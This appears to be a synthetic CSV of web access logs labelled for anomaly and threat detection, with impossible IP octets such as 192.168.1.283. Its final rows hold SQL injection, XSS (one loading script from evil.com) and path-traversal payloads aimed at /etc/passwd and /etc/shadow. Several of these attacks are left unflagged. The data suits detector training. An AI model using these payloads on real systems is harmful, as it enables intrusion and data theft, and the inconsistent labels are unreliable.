timestamp,ip,method,url,status,size,raw,parsed,request,potential_threats,message,level,Anomaly_Flag
09/May/2025:10:24:25 +0000,192.168.1.283,GET,/script.min.js,200.0,3456.0,"192.168.1.283 - - [09/May/2025:10:24:25 +0000] ""GET /script.min.js HTTP/1.1"" 200 3456",True,GET /script.min.js HTTP/1.1,,GET /script.min.js HTTP/1.1,INFO,0
09/May/2025:10:24:30 +0000,192.168.1.284,POST,/api/v2/data,201.0,6789.0,"192.168.1.284 - - [09/May/2025:10:24:30 +0000] ""POST /api/v2/data HTTP/1.1"" 201 6789",True,POST /api/v2/data HTTP/1.1,,POST /api/v2/data HTTP/1.1,INFO,0
09/May/2025:10:24:35 +0000,192.168.1.285,GET,/data.xml,200.0,4321.0,"192.168.1.285 - - [09/May/2025:10:24:35 +0000] ""GET /data.xml HTTP/1.1"" 200 4321",True,GET /data.xml HTTP/1.1,,GET /data.xml HTTP/1.1,INFO,0
09/May/2025:10:24:40 +0000,192.168.1.286,GET,/archive/2024/04.zip,200.0,9876.0,"192.168.1.286 - - [09/May/2025:10:24:40 +0000] ""GET /archive/2024/04.zip HTTP/1.1"" 200 9876",True,GET /archive/2024/04.zip HTTP/1.1,,GET /archive/2024/04.zip HTTP/1.1,INFO,0
09/May/2025:10:24:45 +0000,192.168.1.287,GET,/page-a,200.0,2345.0,"192.168.1.287 - - [09/May/2025:10:24:45 +0000] ""GET /page-a HTTP/1.1"" 200 2345",True,GET /page-a HTTP/1.1,,GET /page-a HTTP/1.1,INFO,0
09/May/2025:10:24:50 +0000,192.168.1.288,GET,/page-b,200.0,1890.0,"192.168.1.288 - - [09/May/2025:10:24:50 +0000] ""GET /page-b HTTP/1.1"" 200 1890",True,GET /page-b HTTP/1.1,,GET /page-b HTTP/1.1,INFO,0
09/May/2025:10:24:55 +0000,192.168.1.289,GET,/section/part-two,200.0,123.0,"192.168.1.289 - - [09/May/2025:10:24:55 +0000] ""GET /section/part-two HTTP/1.1"" 200 123",True,GET /section/part-two HTTP/1.1,,GET /section/part-two HTTP/1.1,INFO,0
09/May/2025:10:25:00 +0000,192.168.1.290,GET,/category/books,200.0,456.0,"192.168.1.290 - - [09/May/2025:10:25:00 +0000] ""GET /category/books HTTP/1.1"" 200 456",True,GET /category/books HTTP/1.1,,GET /category/books HTTP/1.1,INFO,0
09/May/2025:10:25:05 +0000,192.168.1.291,GET,/item-info?id=789,200.0,789.0,"192.168.1.291 - - [09/May/2025:10:25:05 +0000] ""GET /item-info?id=789 HTTP/1.1"" 200 789",True,GET /item-info?id=789 HTTP/1.1,,GET /item-info?id=789 HTTP/1.1,INFO,0
09/May/2025:10:25:10 +0000,192.168.1.292,GET,/details?id=abc&type=def,200.0,3210.0,"192.168.1.292 - - [09/May/2025:10:25:10 +0000] ""GET /details?id=abc&type=def HTTP/1.1"" 200 3210",True,GET /details?id=abc&type=def HTTP/1.1,,GET /details?id=abc&type=def HTTP/1.1,INFO,0
09/May/2025:10:25:15 +0000,192.168.1.293,GET,/info?param=long+value,200.0,1598.0,"192.168.1.293 - - [09/May/2025:10:25:15 +0000] ""GET /info?param=long+value HTTP/1.1"" 200 1598",True,GET /info?param=long+value HTTP/1.1,,GET /info?param=long+value HTTP/1.1,INFO,0
09/May/2025:10:25:20 +0000,192.168.1.294,POST,/submit-review,200.0,5874.0,"192.168.1.294 - - [09/May/2025:10:25:20 +0000] ""POST /submit-review HTTP/1.1"" 200 5874",True,POST /submit-review HTTP/1.1,,POST /submit-review HTTP/1.1,INFO,0
09/May/2025:10:25:25 +0000,192.168.1.295,PUT,/update-item,200.0,2659.0,"192.168.1.295 - - [09/May/2025:10:25:25 +0000] ""PUT /update-item HTTP/1.1"" 200 2659",True,PUT /update-item HTTP/1.1,,PUT /update-item HTTP/1.1,INFO,0
09/May/2025:10:25:30 +0000,192.168.1.296,DELETE,/remove-product,204.0,0.0,"192.168.1.296 - - [09/May/2025:10:25:30 +0000] ""DELETE /remove-product HTTP/1.1"" 204 0",True,DELETE /remove-product HTTP/1.1,,DELETE /remove-product HTTP/1.1,INFO,0
09/May/2025:10:25:35 +0000,192.168.1.297,GET,/user-dashboard,200.0,1478.0,"192.168.1.297 - - [09/May/2025:10:25:35 +0000] ""GET /user-dashboard HTTP/1.1"" 200 1478",True,GET /user-dashboard HTTP/1.1,,GET /user-dashboard HTTP/1.1,INFO,0
09/May/2025:10:25:40 +0000,192.168.1.298,GET,/administrator,302.0,0.0,"192.168.1.298 - - [09/May/2025:10:25:40 +0000] ""GET /administrator HTTP/1.1"" 302 0",True,GET /administrator HTTP/1.1,,GET /administrator HTTP/1.1,INFO,0
09/May/2025:10:25:45 +0000,192.168.1.299,GET,/admin/users/edit,403.0,654.0,"192.168.1.299 - - [09/May/2025:10:25:45 +0000] ""GET /admin/users/edit HTTP/1.1"" 403 654",True,GET /admin/users/edit HTTP/1.1,,GET /admin/users/edit HTTP/1.1,INFO,1
09/May/2025:10:25:50 +0000,192.168.1.300,POST,/admin/create-user,201.0,987.0,"192.168.1.300 - - [09/May/2025:10:25:50 +0000] ""POST /admin/create-user HTTP/1.1"" 201 987",True,POST /admin/create-user HTTP/1.1,,POST /admin/create-user HTTP/1.1,INFO,0
09/May/2025:10:25:55 +0000,192.168.1.301,GET,/internal/data,403.0,321.0,"192.168.1.301 - - [09/May/2025:10:25:55 +0000] ""GET /internal/data HTTP/1.1"" 403 321",True,GET /internal/data HTTP/1.1,,GET /internal/data HTTP/1.1,INFO,1
09/May/2025:10:26:00 +0000,192.168.1.302,GET,/resource-missing,404.0,789.0,"192.168.1.302 - - [09/May/2025:10:26:00 +0000] ""GET /resource-missing HTTP/1.1"" 404 789",True,GET /resource-missing HTTP/1.1,,GET /resource-missing HTTP/1.1,INFO,0
09/May/2025:10:26:05 +0000,192.168.1.303,GET,/service-unavailable,503.0,963.0,"192.168.1.303 - - [09/May/2025:10:26:05 +0000] ""GET /service-unavailable HTTP/1.1"" 503 963",True,GET /service-unavailable HTTP/1.1,,GET /service-unavailable HTTP/1.1,INFO,0
,,,,,,"192.168.1.304 - - [09/May/2025:10:26:10 +0000] ""GET / HTTP/1.1"" 304 -",False,,,,INFO,0
09/May/2025:10:26:15 +0000,192.168.1.305,HEAD,/main.css,200.0,0.0,"192.168.1.305 - - [09/May/2025:10:26:15 +0000] ""HEAD /main.css HTTP/1.1"" 200 0",True,HEAD /main.css HTTP/1.1,,HEAD /main.css HTTP/1.1,INFO,0
09/May/2025:10:26:20 +0000,192.168.1.306,OPTIONS,/api/v5,200.0,456.0,"192.168.1.306 - - [09/May/2025:10:26:20 +0000] ""OPTIONS /api/v5 HTTP/1.1"" 200 456",True,OPTIONS /api/v5 HTTP/1.1,,OPTIONS /api/v5 HTTP/1.1,INFO,0
09/May/2025:10:26:25 +0000,192.168.1.307,TRACE,/index.min.js,200.0,123.0,"192.168.1.307 - - [09/May/2025:10:26:25 +0000] ""TRACE /index.min.js HTTP/1.1"" 200 123",True,TRACE /index.min.js HTTP/1.1,,TRACE /index.min.js HTTP/1.1,INFO,0
09/May/2025:10:26:30 +0000,192.168.1.308,CONNECT,api.example.com:80,200.0,0.0,"192.168.1.308 - - [09/May/2025:10:26:30 +0000] ""CONNECT api.example.com:80 HTTP/1.1"" 200 0",True,CONNECT api.example.com:80 HTTP/1.1,,CONNECT api.example.com:80 HTTP/1.1,INFO,0
09/May/2025:10:26:35 +0000,192.168.1.309,PATCH,/api/v2/items,200.0,789.0,"192.168.1.309 - - [09/May/2025:10:26:35 +0000] ""PATCH /api/v2/items HTTP/1.1"" 200 789",True,PATCH /api/v2/items HTTP/1.1,,PATCH /api/v2/items HTTP/1.1,INFO,0
09/May/2025:10:26:40 +0000,192.168.1.310,PROPFIND,/webdav/public/,207.0,321.0,"192.168.1.310 - - [09/May/2025:10:26:40 +0000] ""PROPFIND /webdav/public/ HTTP/1.1"" 207 321",True,PROPFIND /webdav/public/ HTTP/1.1,,PROPFIND /webdav/public/ HTTP/1.1,INFO,0
09/May/2025:10:26:45 +0000,192.168.1.311,GET,/image-small.png,200.0,3456.0,"192.168.1.311 - - [09/May/2025:10:26:45 +0000] ""GET /image-small.png HTTP/1.1"" 200 3456",True,GET /image-small.png HTTP/1.1,,GET /image-small.png HTTP/1.1,INFO,0
09/May/2025:10:26:50 +0000,192.168.1.312,POST,/api/v3/users,201.0,6789.0,"192.168.1.312 - - [09/May/2025:10:26:50 +0000] ""POST /api/v3/users HTTP/1.1"" 201 6789",True,POST /api/v3/users HTTP/1.1,,POST /api/v3/users HTTP/1.1,INFO,0
09/May/2025:10:26:55 +0000,192.168.1.313,GET,/data-backup.zip,200.0,4321.0,"192.168.1.313 - - [09/May/2025:10:26:55 +0000] ""GET /data-backup.zip HTTP/1.1"" 200 4321",True,GET /data-backup.zip HTTP/1.1,,GET /data-backup.zip HTTP/1.1,INFO,0
09/May/2025:10:27:00 +0000,192.168.1.314,GET,/old-website,301.0,9876.0,"192.168.1.314 - - [09/May/2025:10:27:00 +0000] ""GET /old-website HTTP/1.1"" 301 9876",True,GET /old-website HTTP/1.1,,GET /old-website HTTP/1.1,INFO,0
09/May/2025:10:27:05 +0000,192.168.1.315,GET,/article-one,200.0,2345.0,"192.168.1.315 - - [09/May/2025:10:27:05 +0000] ""GET /article-one HTTP/1.1"" 200 2345",True,GET /article-one HTTP/1.1,,GET /article-one HTTP/1.1,INFO,0
09/May/2025:10:27:10 +0000,192.168.1.316,GET,/article-two,200.0,1890.0,"192.168.1.316 - - [09/May/2025:10:27:10 +0000] ""GET /article-two HTTP/1.1"" 200 1890",True,GET /article-two HTTP/1.1,,GET /article-two HTTP/1.1,INFO,0
09/May/2025:10:27:15 +0000,192.168.1.317,GET,/subsection/item-a,200.0,123.0,"192.168.1.317 - - [09/May/2025:10:27:15 +0000] ""GET /subsection/item-a HTTP/1.1"" 200 123",True,GET /subsection/item-a HTTP/1.1,,GET /subsection/item-a HTTP/1.1,INFO,0
09/May/2025:10:27:20 +0000,192.168.1.318,GET,/category/tools,200.0,456.0,"192.168.1.318 - - [09/May/2025:10:27:20 +0000] ""GET /category/tools HTTP/1.1"" 200 456",True,GET /category/tools HTTP/1.1,,GET /category/tools HTTP/1.1,INFO,0
09/May/2025:10:27:25 +0000,192.168.1.319,GET,/product-details?id=101,200.0,789.0,"192.168.1.319 - - [09/May/2025:10:27:25 +0000] ""GET /product-details?id=101 HTTP/1.1"" 200 789",True,GET /product-details?id=101 HTTP/1.1,,GET /product-details?id=101 HTTP/1.1,INFO,0
09/May/2025:10:27:30 +0000,192.168.1.320,GET,/showcase?item=alpha&ref=123,200.0,3210.0,"192.168.1.320 - - [09/May/2025:10:27:30 +0000] ""GET /showcase?item=alpha&ref=123 HTTP/1.1"" 200 3210",True,GET /showcase?item=alpha&ref=123 HTTP/1.1,,GET /showcase?item=alpha&ref=123 HTTP/1.1,INFO,0
09/May/2025:10:27:35 +0000,192.168.1.321,GET,/information?data=long+string,200.0,1598.0,"192.168.1.321 - - [09/May/2025:10:27:35 +0000] ""GET /information?data=long+string HTTP/1.1"" 200 1598",True,GET /information?data=long+string HTTP/1.1,,GET /information?data=long+string HTTP/1.1,INFO,0
09/May/2025:10:27:40 +0000,192.168.1.322,POST,/submit-application,200.0,5874.0,"192.168.1.322 - - [09/May/2025:10:27:40 +0000] ""POST /submit-application HTTP/1.1"" 200 5874",True,POST /submit-application HTTP/1.1,,POST /submit-application HTTP/1.1,INFO,0
09/May/2025:10:27:45 +0000,192.168.1.323,PUT,/update-settings,200.0,2659.0,"192.168.1.323 - - [09/May/2025:10:27:45 +0000] ""PUT /update-settings HTTP/1.1"" 200 2659",True,PUT /update-settings HTTP/1.1,,PUT /update-settings HTTP/1.1,INFO,0
09/May/2025:10:27:50 +0000,192.168.1.324,DELETE,/remove-account,204.0,0.0,"192.168.1.324 - - [09/May/2025:10:27:50 +0000] ""DELETE /remove-account HTTP/1.1"" 204 0",True,DELETE /remove-account HTTP/1.1,,DELETE /remove-account HTTP/1.1,INFO,0
09/May/2025:10:27:55 +0000,192.168.1.325,GET,/user/home,200.0,1478.0,"192.168.1.325 - - [09/May/2025:10:27:55 +0000] ""GET /user/home HTTP/1.1"" 200 1478",True,GET /user/home HTTP/1.1,,GET /user/home HTTP/1.1,INFO,0
09/May/2025:10:28:00 +0000,192.168.1.326,GET,/login-page,200.0,3698.0,"192.168.1.326 - - [09/May/2025:10:28:00 +0000] ""GET /login-page HTTP/1.1"" 200 3698",True,GET /login-page HTTP/1.1,,GET /login-page HTTP/1.1,INFO,0
09/May/2025:10:28:05 +0000,192.168.1.327,POST,/login-submit,200.0,7412.0,"192.168.1.327 - - [09/May/2025:10:28:05 +0000] ""POST /login-submit HTTP/1.1"" 200 7412",True,POST /login-submit HTTP/1.1,,POST /login-submit HTTP/1.1,INFO,0
09/May/2025:10:28:10 +0000,192.168.1.328,GET,/admin/home,302.0,0.0,"192.168.1.328 - - [09/May/2025:10:28:10 +0000] ""GET /admin/home HTTP/1.1"" 302 0",True,GET /admin/home HTTP/1.1,,GET /admin/home HTTP/1.1,INFO,0
09/May/2025:10:28:15 +0000,192.168.1.329,GET,/admin/security,403.0,654.0,"192.168.1.329 - - [09/May/2025:10:28:15 +0000] ""GET /admin/security HTTP/1.1"" 403 654",True,GET /admin/security HTTP/1.1,,GET /admin/security HTTP/1.1,INFO,1
09/May/2025:10:28:20 +0000,192.168.1.330,POST,/admin/new-article,201.0,987.0,"192.168.1.330 - - [09/May/2025:10:28:20 +0000] ""POST /admin/new-article HTTP/1.1"" 201 987",True,POST /admin/new-article HTTP/1.1,,POST /admin/new-article HTTP/1.1,INFO,0
09/May/2025:10:28:25 +0000,192.168.1.331,GET,/private/dashboard,403.0,321.0,"192.168.1.331 - - [09/May/2025:10:28:25 +0000] ""GET /private/dashboard HTTP/1.1"" 403 321",True,GET /private/dashboard HTTP/1.1,,GET /private/dashboard HTTP/1.1,INFO,1
09/May/2025:10:28:30 +0000,192.168.1.332,GET,/page-not-found,404.0,789.0,"192.168.1.332 - - [09/May/2025:10:28:30 +0000] ""GET /page-not-found HTTP/1.1"" 404 789",True,GET /page-not-found HTTP/1.1,,GET /page-not-found HTTP/1.1,INFO,0
09/May/2025:10:28:35 +0000,192.168.1.333,GET,/gateway-timeout,504.0,963.0,"192.168.1.333 - - [09/May/2025:10:28:35 +0000] ""GET /gateway-timeout HTTP/1.1"" 504 963",True,GET /gateway-timeout HTTP/1.1,,GET /gateway-timeout HTTP/1.1,INFO,0
,,,,,,"192.168.1.334 - - [09/May/2025:10:28:40 +0000] ""GET / HTTP/1.1"" 304 -",False,,,,INFO,0
09/May/2025:10:28:45 +0000,192.168.1.335,HEAD,/style.bundle.css,200.0,0.0,"192.168.1.335 - - [09/May/2025:10:28:45 +0000] ""HEAD /style.bundle.css HTTP/1.1"" 200 0",True,HEAD /style.bundle.css HTTP/1.1,,HEAD /style.bundle.css HTTP/1.1,INFO,0
09/May/2025:10:28:50 +0000,192.168.1.336,OPTIONS,/api/,200.0,123.0,"192.168.1.336 - - [09/May/2025:10:28:50 +0000] ""OPTIONS /api/ HTTP/1.1"" 200 123",True,OPTIONS /api/ HTTP/1.1,,OPTIONS /api/ HTTP/1.1,INFO,0
09/May/2025:10:28:55 +0000,192.168.1.337,TRACE,/script.bundle.js,200.0,456.0,"192.168.1.337 - - [09/May/2025:10:28:55 +0000] ""TRACE /script.bundle.js HTTP/1.1"" 200 456",True,TRACE /script.bundle.js HTTP/1.1,,TRACE /script.bundle.js HTTP/1.1,INFO,0
09/May/2025:10:29:00 +0000,192.168.1.338,CONNECT,www.google.com:443,200.0,0.0,"192.168.1.338 - - [09/May/2025:10:29:00 +0000] ""CONNECT www.google.com:443 HTTP/1.1"" 200 0",True,CONNECT www.google.com:443 HTTP/1.1,,CONNECT www.google.com:443 HTTP/1.1,INFO,0
09/May/2025:10:29:05 +0000,192.168.1.339,PATCH,/api/v3/items,200.0,789.0,"192.168.1.339 - - [09/May/2025:10:29:05 +0000] ""PATCH /api/v3/items HTTP/1.1"" 200 789",True,PATCH /api/v3/items HTTP/1.1,,PATCH /api/v3/items HTTP/1.1,INFO,0
09/May/2025:10:29:10 +0000,192.168.1.340,PROPFIND,/webdav/shared/files/,207.0,321.0,"192.168.1.340 - - [09/May/2025:10:29:10 +0000] ""PROPFIND /webdav/shared/files/ HTTP/1.1"" 207 321",True,PROPFIND /webdav/shared/files/ HTTP/1.1,,PROPFIND /webdav/shared/files/ HTTP/1.1,INFO,0
09/May/2025:10:29:15 +0000,192.168.1.341,GET,/image-large.jpg,200.0,3456.0,"192.168.1.341 - - [09/May/2025:10:29:15 +0000] ""GET /image-large.jpg HTTP/1.1"" 200 3456",True,GET /image-large.jpg HTTP/1.1,,GET /image-large.jpg HTTP/1.1,INFO,0
09/May/2025:10:29:20 +0000,192.168.1.342,POST,/api/v4/users,201.0,6789.0,"192.168.1.342 - - [09/May/2025:10:29:20 +0000] ""POST /api/v4/users HTTP/1.1"" 201 6789",True,POST /api/v4/users HTTP/1.1,,POST /api/v4/users HTTP/1.1,INFO,0
09/May/2025:10:29:25 +0000,192.168.1.343,GET,/database-dump.sql.gz,200.0,4321.0,"192.168.1.343 - - [09/May/2025:10:29:25 +0000] ""GET /database-dump.sql.gz HTTP/1.1"" 200 4321",True,GET /database-dump.sql.gz HTTP/1.1,,GET /database-dump.sql.gz HTTP/1.1,INFO,0
09/May/2025:10:29:30 +0000,192.168.1.344,GET,/legacy-site,301.0,9876.0,"192.168.1.344 - - [09/May/2025:10:29:30 +0000] ""GET /legacy-site HTTP/1.1"" 301 9876",True,GET /legacy-site HTTP/1.1,,GET /legacy-site HTTP/1.1,INFO,0
09/May/2025:10:29:35 +0000,192.168.1.345,GET,/article-iii,200.0,2345.0,"192.168.1.345 - - [09/May/2025:10:29:35 +0000] ""GET /article-iii HTTP/1.1"" 200 2345",True,GET /article-iii HTTP/1.1,,GET /article-iii HTTP/1.1,INFO,0
09/May/2025:10:29:40 +0000,192.168.1.346,GET,/article-iv,200.0,1890.0,"192.168.1.346 - - [09/May/2025:10:29:40 +0000] ""GET /article-iv HTTP/1.1"" 200 1890",True,GET /article-iv HTTP/1.1,,GET /article-iv HTTP/1.1,INFO,0
09/May/2025:10:29:45 +0000,192.168.1.347,GET,/subsection/item-b,200.0,123.0,"192.168.1.347 - - [09/May/2025:10:29:45 +0000] ""GET /subsection/item-b HTTP/1.1"" 200 123",True,GET /subsection/item-b HTTP/1.1,,GET /subsection/item-b HTTP/1.1,INFO,0
09/May/2025:10:29:50 +0000,192.168.1.348,GET,/category/electronics/phones,200.0,456.0,"192.168.1.348 - - [09/May/2025:10:29:50 +0000] ""GET /category/electronics/phones HTTP/1.1"" 200 456",True,GET /category/electronics/phones HTTP/1.1,,GET /category/electronics/phones HTTP/1.1,INFO,0
09/May/2025:10:29:55 +0000,192.168.1.349,GET,/product-info?id=202,200.0,789.0,"192.168.1.349 - - [09/May/2025:10:29:55 +0000] ""GET /product-info?id=202 HTTP/1.1"" 200 789",True,GET /product-info?id=202 HTTP/1.1,,GET /product-info?id=202 HTTP/1.1,INFO,0
09/May/2025:23:01:00 +0000,192.168.1.10,GET,/?q=';,200.0,1234.0,"192.168.1.10 - - [09/May/2025:23:01:00 +0000] ""GET /?q='; DROP TABLE users; -- HTTP/1.1"" 200 1234",True,GET /?q='; DROP TABLE users; -- HTTP/1.1,['SQL_INJECTION'],GET /?q='; DROP TABLE users; -- HTTP/1.1,INFO,1
09/May/2025:23:01:01 +0000,192.168.1.11,GET,/item?id=1,200.0,1567.0,"192.168.1.11 - - [09/May/2025:23:01:01 +0000] ""GET /item?id=1 UNION SELECT password FROM users HTTP/1.1"" 200 1567",True,GET /item?id=1 UNION SELECT password FROM users HTTP/1.1,['SQL_INJECTION'],GET /item?id=1 UNION SELECT password FROM users HTTP/1.1,INFO,1
09/May/2025:23:01:02 +0000,192.168.1.12,GET,/search?term=<script>alert('XSS')</script>,200.0,2345.0,"192.168.1.12 - - [09/May/2025:23:01:02 +0000] ""GET /search?term=<script>alert('XSS')</script> HTTP/1.1"" 200 2345",True,GET /search?term=<script>alert('XSS')</script> HTTP/1.1,['XSS'],GET /search?term=<script>alert('XSS')</script> HTTP/1.1,INFO,1
09/May/2025:23:01:03 +0000,192.168.1.13,GET,/image?file=../../../etc/passwd,200.0,987.0,"192.168.1.13 - - [09/May/2025:23:01:03 +0000] ""GET /image?file=../../../etc/passwd HTTP/1.1"" 200 987",True,GET /image?file=../../../etc/passwd HTTP/1.1,,GET /image?file=../../../etc/passwd HTTP/1.1,INFO,0
09/May/2025:23:01:04 +0000,192.168.1.14,GET,/admin/config.php,403.0,456.0,"192.168.1.14 - - [09/May/2025:23:01:04 +0000] ""GET /admin/config.php HTTP/1.1"" 403 456",True,GET /admin/config.php HTTP/1.1,,GET /admin/config.php HTTP/1.1,INFO,1
09/May/2025:23:01:05 +0000,192.168.1.15,POST,/login,401.0,789.0,"192.168.1.15 - - [09/May/2025:23:01:05 +0000] ""POST /login HTTP/1.1"" 401 789",True,POST /login HTTP/1.1,,POST /login HTTP/1.1,INFO,1
09/May/2025:23:01:06 +0000,192.168.1.16,GET,/../../../../etc/shadow,404.0,123.0,"192.168.1.16 - - [09/May/2025:23:01:06 +0000] ""GET /../../../../etc/shadow HTTP/1.1"" 404 123",True,GET /../../../../etc/shadow HTTP/1.1,,GET /../../../../etc/shadow HTTP/1.1,INFO,0
09/May/2025:23:01:07 +0000,192.168.1.17,GET,/?id=1',200.0,1890.0,"192.168.1.17 - - [09/May/2025:23:01:07 +0000] ""GET /?id=1' OR '1'='1' -- HTTP/1.1"" 200 1890",True,GET /?id=1' OR '1'='1' -- HTTP/1.1,,GET /?id=1' OR '1'='1' -- HTTP/1.1,INFO,0
09/May/2025:23:01:08 +0000,192.168.1.18,GET,/user/<script,200.0,3210.0,"192.168.1.18 - - [09/May/2025:23:01:08 +0000] ""GET /user/<script src=http://evil.com/malware.js></script> HTTP/1.1"" 200 3210",True,GET /user/<script src=http://evil.com/malware.js></script> HTTP/1.1,['XSS'],GET /user/<script src=http://evil.com/malware.js></script> HTTP/1.1,INFO,1
09/May/2025:23:01:09 +0000,192.168.1.19,GET,/download?file=C:\\windows\\system32\\cmd.exe,403.0,567.0,"192.168.1.19 - - [09/May/2025:23:01:09 +0000] ""GET /download?file=C:\\windows\\system32\\cmd.exe HTTP/1.1"" 403 567",True,GET /download?file=C:\\windows\\system32\\cmd.exe HTTP/1.1,,GET /download?file=C:\\windows\\system32\\cmd.exe HTTP/1.1,INFO,1
09/May/2025:23:01:10 +0000,192.168.1.20,GET,/secret/data,401.0,890.0,"192.168.1.20 - - [09/May/2025:23:01:10 +0000] ""GET /secret/data HTTP/1.1"" 401 890",True,GET /secret/data HTTP/1.1,,GET /secret/data HTTP/1.1,INFO,1
09/May/2025:23:01:11 +0000,192.168.1.21,GET,/search?q=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E,200.0,210.0,"192.168.1.21 - - [09/May/2025:23:01:11 +0000] ""GET /search?q=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1"" 200 210",True,GET /search?q=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,['XSS'],GET /search?q=%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E HTTP/1.1,INFO,1
09/May/2025:23:01:12 +0000,192.168.1.22,GET,/../../etc/apache2/apache2.conf,404.0,345.0,"192.168.1.22 - - [09/May/2025:23:01:12 +0000] ""GET /../../etc/apache2/apache2.conf HTTP/1.1"" 404 345",True,GET /../../etc/apache2/apache2.conf HTTP/1.1,,GET /../../etc/apache2/apache2.conf HTTP/1.1,INFO,0
09/May/2025:23:01:13 +0000,192.168.1.23,GET,/index.php?page=../../../../etc/passwd,200.0,678.0,"192.168.1.23 - - [09/May/2025:23:01:13 +0000] ""GET /index.php?page=../../../../etc/passwd HTTP/1.1"" 200 678",True,GET /index.php?page=../../../../etc/passwd HTTP/1.1,,GET /index.php?page=../../../../etc/passwd HTTP/1.1,INFO,0
09/May/2025:23:01:14 +0000,192.168.1.24,GET,/admin.php,302.0,901.0,"192.168.1.24 - - [09/May/2025:23:01:14 +0000] ""GET /admin.php HTTP/1.1"" 302 901",True,GET /admin.php HTTP/1.1,,GET /admin.php HTTP/1.1,INFO,0
09/May/2025:23:01:15 +0000,192.168.1.25,POST,/upload,405.0,234.0,"192.168.1.25 - - [09/May/2025:23:01:15 +0000] ""POST /upload HTTP/1.1"" 405 234",True,POST /upload HTTP/1.1,,POST /upload HTTP/1.1,INFO,0
09/May/2025:23:01:16 +0000,192.168.1.26,GET,/FUZZ,400.0,567.0,"192.168.1.26 - - [09/May/2025:23:01:16 +0000] ""GET /FUZZ HTTP/1.1"" 400 567",True,GET /FUZZ HTTP/1.1,,GET /FUZZ HTTP/1.1,INFO,1
09/May/2025:23:01:17 +0000,192.168.1.27,GET,/?query=1;,200.0,890.0,"192.168.1.27 - - [09/May/2025:23:01:17 +0000] ""GET /?query=1; SLEEP(5); -- HTTP/1.1"" 200 890",True,GET /?query=1; SLEEP(5); -- HTTP/1.1,,GET /?query=1; SLEEP(5); -- HTTP/1.1,INFO,0
09/May/2025:23:01:18 +0000,192.168.1.28,GET,/home.php?ref=<img,200.0,123.0,"192.168.1.28 - - [09/May/2025:23:01:18 +0000] ""GET /home.php?ref=<img src='x' onerror=alert('XSS')> HTTP/1.1"" 200 123",True,GET /home.php?ref=<img src='x' onerror=alert('XSS')> HTTP/1.1,['XSS'],GET /home.php?ref=<img src='x' onerror=alert('XSS')> HTTP/1.1,INFO,1
09/May/2025:23:01:19 +0000,192.168.1.29,GET,/data?file=/opt/sensitive.log,403.0,456.0,"192.168.1.29 - - [09/May/2025:23:01:19 +0000] ""GET /data?file=/opt/sensitive.log HTTP/1.1"" 403 456",True,GET /data?file=/opt/sensitive.log HTTP/1.1,,GET /data?file=/opt/sensitive.log HTTP/1.1,INFO,1
09/May/2025:23:01:20 +0000,192.168.1.30,GET,/private/,401.0,789.0,"192.168.1.30 - - [09/May/2025:23:01:20 +0000] ""GET /private/ HTTP/1.1"" 401 789",True,GET /private/ HTTP/1.1,,GET /private/ HTTP/1.1,INFO,1
09/May/2025:23:01:21 +0000,192.168.1.31,GET,/search?input=%3Ciframe%20src=javascript:alert('XSS')%3E,200.0,901.0,"192.168.1.31 - - [09/May/2025:23:01:21 +0000] ""GET /search?input=%3Ciframe%20src=javascript:alert('XSS')%3E HTTP/1.1"" 200 901",True,GET /search?input=%3Ciframe%20src=javascript:alert('XSS')%3E HTTP/1.1,['XSS'],GET /search?input=%3Ciframe%20src=javascript:alert('XSS')%3E HTTP/1.1,INFO,1
09/May/2025:23:01:22 +0000,192.168.1.32,GET,/../../../../var/log/apache2/access.log,404.0,234.0,"192.168.1.32 - - [09/May/2025:23:01:22 +0000] ""GET /../../../../var/log/apache2/access.log HTTP/1.1"" 404 234",True,GET /../../../../var/log/apache2/access.log HTTP/1.1,,GET /../../../../var/log/apache2/access.log HTTP/1.1,INFO,0
09/May/2025:23:01:23 +0000,192.168.1.33,GET,/index.jsp?param=';,200.0,567.0,"192.168.1.33 - - [09/May/2025:23:01:23 +0000] ""GET /index.jsp?param='; DELETE FROM products; -- HTTP/1.1"" 200 567",True,GET /index.jsp?param='; DELETE FROM products; -- HTTP/1.1,['SQL_INJECTION'],GET /index.jsp?param='; DELETE FROM products; -- HTTP/1.1,INFO,1
